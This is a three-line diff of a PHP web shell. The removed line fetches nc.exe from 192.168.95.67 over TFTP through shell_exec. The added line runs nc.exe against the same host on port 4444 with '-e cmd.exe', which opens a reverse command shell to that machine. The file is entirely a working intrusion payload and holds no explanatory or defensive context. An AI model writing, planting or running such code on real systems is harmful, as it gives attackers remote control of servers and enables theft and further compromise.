@@ -1,3 +1,3 @@
 <?php
-echo shell_exec("tftp -i 192.168.95.67 GET nc.exe");
+echo shell_exec("nc.exe -nvv 192.168.95.67 4444 -e cmd.exe")
 ?>
